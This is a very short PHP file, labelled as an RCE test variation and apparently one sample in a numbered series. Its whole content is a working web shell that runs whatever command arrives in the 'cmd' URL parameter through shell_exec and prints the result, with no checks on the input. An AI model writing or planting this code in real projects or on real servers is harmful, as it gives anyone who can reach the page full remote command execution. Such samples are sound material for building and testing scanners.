<?php
// RCE test variation #1182
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>